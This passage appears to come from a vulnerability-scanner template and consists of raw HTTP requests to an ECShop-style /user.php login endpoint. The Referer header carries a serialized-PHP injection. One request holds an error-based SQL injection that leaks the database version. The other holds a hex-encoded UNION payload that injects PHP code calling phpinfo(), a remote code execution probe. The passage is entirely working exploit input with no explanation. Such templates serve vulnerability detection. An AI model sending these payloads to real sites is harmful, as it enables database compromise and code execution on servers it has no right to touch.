    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure
    analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}

    '
  - 'GET /user.php?act=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10--
